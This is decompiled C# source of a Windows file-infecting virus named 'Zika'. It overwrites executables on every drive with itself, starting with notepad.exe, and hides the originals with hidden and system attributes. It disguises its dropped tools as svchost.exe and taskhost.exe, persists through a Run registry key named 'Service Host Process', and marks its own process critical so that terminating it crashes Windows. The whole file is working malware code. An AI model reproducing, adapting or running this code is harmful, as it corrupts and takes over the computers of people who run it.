using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Zika.Properties;

namespace Zika;

internal static class Program
{
	private static int inf = 0;

	private static string MY;

	private static long MYlen = 0L;

	private static string rh_f = Guid.NewGuid().ToString("N");

	private static Random rnd = new Random();

	private static string rh_tn = Path.Combine(Path.GetTempPath(), rh_f);

	private static string rh_a = "";

	private static string rh_b = "";

	private const uint LOAD_LIBRARY_AS_DATAFILE = 2u;

	public static bool debugmode = false;

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool AllocConsole();

	private static bool Is64Bit()
	{
		if (IntPtr.Size != 8 && (IntPtr.Size != 4 || !Is32BitProcessOn64BitProcessor()))
		{
			return false;
		}
		return true;
	}

	[DllImport("kernel32")]
	private static extern ulong GetTickCount64();

	private static bool Is32BitProcessOn64BitProcessor()
	{
		IsWow64Process(Process.GetCurrentProcess().Handle, out var lpSystemInfo);
		return lpSystemInfo;
	}

	public static long GetLastSystemShutdown()
	{
		return Convert.ToInt64((ulong)DateTime.Now.Subtract(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds - GetTickCount64()) / 1000L;
	}

	private static bool ProcessFile(string fn)
	{
		string text = fn.Substring(0, fn.Length - 4) + ".dll.sys.exe";
		if (fn.EndsWith(".dll.sys.exe"))
		{
			return false;
		}
		if (fn.EndsWith(".dll.sys.sys.exe"))
		{
			return false;
		}
		if (fn.EndsWith(".sys.dll.exe"))
		{
			return false;
		}
		if (File.Exists(text))
		{
			return false;
		}
		if (fn.StartsWith(rh_tn))
		{
			return false;
		}
		try
		{
			try
			{
				FileSecurity accessControl = File.GetAccessControl(fn);
				FileSystemAccessRule rule = new FileSystemAccessRule(new NTAccount("", "Everyone"), FileSystemRights.FullControl, AccessControlType.Allow);
				accessControl.AddAccessRule(rule);
				File.SetAccessControl(fn, accessControl);
			}
			catch (Exception)
			{
			}
			File.Copy(fn, text);
			FileInfo fileInfo = new FileInfo(text);
			FileAttributes attributes = fileInfo.Attributes;
			fileInfo.Attributes |= FileAttributes.Hidden | FileAttributes.System;
			Thread.Sleep(100);
			if (File.Exists(fn))
			{
				File.Delete(fn);
			}
			File.Copy(MY, fn);
			new FileInfo(fn).Attributes = attributes;
			try
			{
				string path = Guid.NewGuid().ToString("N");
				Path.Combine(Path.GetTempPath(), path);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = rh_a;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.WorkingDirectory = rh_tn;
				processStartInfo.Arguments = "-extract " + text + ", " + Path.Combine(rh_tn, "icons.rc") + ", icongroup,,";
				if (debugmode)
				{
					Console.WriteLine(processStartInfo.Arguments);
				}
				Process.Start(processStartInfo)!.WaitForExit();
				processStartInfo = new ProcessStartInfo();
				processStartInfo.CreateNoWindow = true;
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = rh_b;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.WorkingDirectory = rh_tn;
				processStartInfo.Arguments = ("-compile " + Path.Combine(rh_tn, "icons.rc") + ", " + Path.Combine(rh_tn, "icons.res")) ?? "";
				if (debugmode)
				{
					Console.WriteLine(processStartInfo.Arguments);
				}
				Process.Start(processStartInfo)!.WaitForExit();
				bool flag = false;
				FileInfo[] files = new DirectoryInfo(rh_tn).GetFiles("*.ico");
				int num = 0;
				if (0 < files.Length)
				{
					flag = true;
				}
				if (flag)
				{
					processStartInfo = new ProcessStartInfo();
					processStartInfo.CreateNoWindow = true;
					processStartInfo.UseShellExecute = false;
					processStartInfo.FileName = rh_a;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.WorkingDirectory = rh_tn;
					processStartInfo.Arguments = "-addoverwrite " + fn + "\", \"" + fn + ", " + Path.Combine(rh_tn, "icons.res") + ", icongroup,,";
					if (debugmode)
					{
						Console.WriteLine(processStartInfo.Arguments);
					}
					Process.Start(processStartInfo)!.WaitForExit();
				}
				files = (from p in new DirectoryInfo(rh_tn).GetFiles("*.ico")
					where p.Extension == ".ico"
					select p).ToArray();
				foreach (FileInfo obj in files)
				{
					obj.Attributes = FileAttributes.Normal;
					obj.Delete();
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine(ex2.ToString());
			}
			Console.WriteLine("infected " + fn);
			Console.WriteLine("as " + text + ", success=" + File.Exists(text));
			Console.WriteLine("infect ok");
			inf++;
			return true;
		}
		catch (Exception ex3)
		{
			Console.WriteLine(ex3.ToString());
			return false;
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool UpdateResource(IntPtr hUpdate, IntPtr lpType, IntPtr lpName, ushort wLanguage, IntPtr lpData, uint cbData);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr BeginUpdateResource(string pFileName, [MarshalAs(UnmanagedType.Bool)] bool bDeleteExistingResources);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LockResource(IntPtr hResData);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

	[DllImport("kernel32.dll")]
	private static extern IntPtr FindResource(IntPtr hModule, string lpName, int lpType);

	[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
	private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

	private static string ApplyAllFiles(string folder, Func<string, bool> fileAction)
	{
		string text = "";
		string[] files = Directory.GetFiles(folder);
		int num = 0;
		while (true)
		{
			if (num < files.Length)
			{
				string text2 = files[num];
				if (!(Path.GetExtension(text2) != ".exe"))
				{
					if (fileAction(text2))
					{
						text = text2;
					}
					if (inf >= 10)
					{
						break;
					}
				}
				num++;
				continue;
			}
			files = Directory.GetDirectories(folder);
			num = 0;
			while (true)
			{
				if (num < files.Length)
				{
					string folder2 = files[num];
					if (inf >= 10)
					{
						break;
					}
					try
					{
						if (text == "")
						{
							text = ApplyAllFiles(folder2, fileAction);
						}
					}
					catch
					{
					}
					num++;
					continue;
				}
				return text;
			}
			return text;
		}
		return text;
	}

	private static string CalculateMD5Hash(string input)
	{
		MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(input);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("X2"));
		}
		return stringBuilder.ToString();
	}

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_0759: Unknown result type (might be due to invalid IL or missing references)
		//IL_0994: Unknown result type (might be due to invalid IL or missing references)
		if (debugmode)
		{
			AllocConsole();
		}
		RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Is64Bit() ? RegistryView.Registry64 : RegistryView.Registry32);
		string my = Assembly.GetExecutingAssembly().Location;
		try
		{
			File.WriteAllBytes(Path.Combine(my.Substring(0, my.Length - Path.GetFileName(my)!.Length), "AxInterop.WMPLib.dll"), Resources.AxInterop_WMPLib);
			new FileInfo(Path.Combine(my.Substring(0, my.Length - Path.GetFileName(my)!.Length), "AxInterop.WMPLib.dll")).Attributes |= FileAttributes.Hidden | FileAttributes.System;
		}
		catch (Exception)
		{
		}
		try
		{
			File.WriteAllBytes(Path.Combine(my.Substring(0, my.Length - Path.GetFileName(my)!.Length), "Interop.WMPLib.dll"), Resources.Interop_WMPLib);
			new FileInfo(Path.Combine(my.Substring(0, my.Length - Path.GetFileName(my)!.Length), "Interop.WMPLib.dll")).Attributes |= FileAttributes.Hidden | FileAttributes.System;
		}
		catch (Exception)
		{
		}
		Console.WriteLine(my);
		bool flag = false;
		if (my.EndsWith(".sys.dll.exe"))
		{
			Console.WriteLine("disinfect-run");
			flag = true;
		}
		else
		{
			string text = my.Substring(0, my.Length - 4) + ".dll.sys.exe";
			bool flag2 = false;
			if (File.Exists(text))
			{
				string text2 = my.Substring(0, my.Length - 4) + ".dll.sys.sys.exe";
				string currentDirectory = Environment.CurrentDirectory;
				string text3 = "\"\"" + my + "\"\" " + string.Join(" ", args).Replace("\"", "\"\"");
				string text4 = my.Substring(0, my.Length - 4) + ".sys.dll.exe";
				string contents = "Set oShell = WScript.CreateObject(\"WScript.Shell\")\r\nWscript.Sleep 500\r\nSet fso = WScript.CreateObject(\"Scripting.FileSystemObject\")\r\nfso.CopyFile \"" + my + "\", \"" + text4 + "\"\r\nSet oFile = fso.GetFile(\"" + my + "\")\r\norigattr = oFile.Attributes\r\nfso.MoveFile \"" + my + "\", \"" + text2 + "\"\r\nfso.MoveFile \"" + text + "\", \"" + my + "\"\r\nSet oFile = fso.GetFile(\"" + text4 + "\")\r\noFile.Attributes = oFile.Attributes Or 6\r\nSet oFile = fso.GetFile(\"" + text2 + "\")\r\noFile.Attributes = oFile.Attributes Or 6\r\nSet oFile = fso.GetFile(\"" + my + "\")\r\noFile.Attributes = origattr\r\noShell.CurrentDirectory = \"" + currentDirectory + "\"\r\noShell.Run Chr(34) & \"" + text4 + "\" & Chr(34)\r\noShell.Run \"" + text3 + "\", 1, True\r\nOn Error Resume Next\r\nfso.MoveFile \"" + my + "\", \"" + text + "\"\r\nIf fso.FileExists(\"" + my + "\") Then\r\nfso.DeleteFile \"" + text2 + "\"\r\nfso.DeleteFile \"" + text + "\"\r\nfso.DeleteFile Wscript.ScriptFullName\r\nWscript.Quit()\r\nEnd If\r\nfso.MoveFile \"" + text2 + "\", \"" + my + "\"\r\nSet oFile = fso.GetFile(\"" + text + "\")\r\noFile.Attributes = oFile.Attributes Or 6\r\nSet oFile = fso.GetFile(\"" + my + "\")\r\noFile.Attributes = origattr\r\nfso.DeleteFile Wscript.ScriptFullName\r\n";
				string text5 = Path.Combine(Path.GetTempPath(), CalculateMD5Hash(my) + ".vbs");
				File.WriteAllText(text5, contents);
				Process process = new Process();
				process.StartInfo.FileName = "cscript";
				process.StartInfo.Arguments = "//B //Nologo \"" + text5 + "\"";
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process.Start();
				return;
			}
			flag2 = true;
			if (args.Length != 0 && debugmode)
			{
				try
				{
					int v = int.Parse(args[0]);
					Form1 form = new Form1();
					((Form)form).set_ShowInTaskbar(false);
					form.timertick();
					form.DirectMode();
					form.doPayload(v);
					Application.Run((Form)(object)form);
				}
				catch (Exception)
				{
				}
			}
			if (flag2)
			{
				new Thread((ThreadStart)delegate
				{
					//IL_0014: Unknown result type (might be due to invalid IL or missing references)
					MessageBox.Show((IWin32Window)null, "Cannot find DLL", Path.GetFileName(my), (MessageBoxButtons)0, (MessageBoxIcon)16);
				}).Start();
			}
		}
		bool flag3 = false;
		try
		{
			if (!Directory.Exists(rh_tn))
			{
				Directory.CreateDirectory(rh_tn);
			}
			rh_a = Path.Combine(rh_tn, "svchost.exe");
			rh_b = Path.Combine(rh_tn, "taskhost.exe");
			File.WriteAllBytes(rh_a, Resources.ResHacker);
			File.WriteAllBytes(rh_b, Resources.ResourceHacker);
			using (RegistryKey registryKey2 = registryKey.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", writable: true))
			{
				long num = (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0).ToUniversalTime()).TotalSeconds;
				if (registryKey2.GetValueNames().Contains("WindowsActivationDate"))
				{
					if (num - (long)registryKey2.GetValue("WindowsActivationDate") > 6912000L)
					{
						Console.WriteLine("eheheheh");
					}
					else
					{
						flag3 = true;
						MY = my;
						MYlen = new FileInfo(my).Length;
						inf = 0;
						Console.WriteLine("infectious");
						Console.WriteLine("notepad");
						ProcessFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "notepad.exe"));
						Console.WriteLine("others");
						ApplyAllFiles(Path.GetPathRoot(my), ProcessFile);
						DriveInfo[] drives = DriveInfo.GetDrives();
						foreach (DriveInfo driveInfo in drives)
						{
							if (driveInfo.IsReady)
							{
								inf = 0;
								try
								{
									ApplyAllFiles(driveInfo.RootDirectory.FullName, ProcessFile);
								}
								catch (Exception)
								{
								}
							}
						}
						registryKey2.SetValue("WindowsActivationDate", num, RegistryValueKind.QWord);
						registryKey2.Flush();
					}
				}
				else
				{
					flag3 = true;
					MY = my;
					MYlen = new FileInfo(my).Length;
					inf = 0;
					Console.WriteLine("infectious");
					Console.WriteLine("notepad");
					ProcessFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "notepad.exe"));
					Console.WriteLine("others");
					ApplyAllFiles(Path.GetPathRoot(my), ProcessFile);
					DriveInfo[] drives = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo2 in drives)
					{
						if (driveInfo2.IsReady)
						{
							inf = 0;
							try
							{
								ApplyAllFiles(driveInfo2.RootDirectory.FullName, ProcessFile);
							}
							catch (Exception)
							{
							}
						}
					}
					registryKey2.SetValue("WindowsActivationDate", num, RegistryValueKind.QWord);
					registryKey2.Flush();
				}
			}
			Directory.Delete(rh_tn, recursive: true);
		}
		catch (Exception ex6)
		{
			if (debugmode)
			{
				MessageBox.Show(ex6.ToString());
			}
		}
		if (flag3)
		{
			if (flag)
			{
				Process process2 = new Process();
				process2.StartInfo.FileName = "cmd";
				process2.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2 && del /A:H \"" + my + "\"";
				process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				process2.Start();
			}
			return;
		}
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.add_ThreadException((ThreadExceptionEventHandler)Application_ThreadException);
		Form1 form2 = new Form1();
		using (RegistryKey registryKey3 = registryKey.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", writable: true))
		{
			long lastSystemShutdown = GetLastSystemShutdown();
			if (registryKey3.GetValueNames().Contains("WindowsActivationID"))
			{
				if ((long)registryKey3.GetValue("WindowsActivationID") == lastSystemShutdown)
				{
					return;
				}
				form2.slowTimer();
				registryKey3.SetValue("WindowsActivationID", lastSystemShutdown, RegistryValueKind.QWord);
				registryKey3.Flush();
			}
			else
			{
				registryKey3.SetValue("WindowsActivationID", lastSystemShutdown, RegistryValueKind.QWord);
				registryKey3.Flush();
			}
		}
		try
		{
			MY = my;
			MYlen = new FileInfo(my).Length;
			inf = 0;
			Console.WriteLine("infectious");
			Console.WriteLine("notepad");
			ProcessFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "notepad.exe"));
			Console.WriteLine("others");
			string text6 = ApplyAllFiles(Path.GetPathRoot(my), ProcessFile);
			if (text6 != "")
			{
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo3 in drives)
				{
					if (driveInfo3.IsReady)
					{
						inf = 0;
						try
						{
							ApplyAllFiles(driveInfo3.RootDirectory.FullName, ProcessFile);
						}
						catch (Exception)
						{
						}
					}
				}
				using RegistryKey registryKey4 = registryKey.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey4.SetValue("Service Host Process", "\"" + text6 + "\"", RegistryValueKind.String);
				registryKey4.Flush();
			}
		}
		catch (Exception ex8)
		{
			if (debugmode)
			{
				MessageBox.Show(ex8.ToString());
			}
		}
		Console.WriteLine("running form1");
		int processInformation = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref processInformation, 4);
		((Form)form2).set_ShowInTaskbar(false);
		Application.Run((Form)(object)form2);
	}

	private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
	{
		throw e.Exception;
	}
}
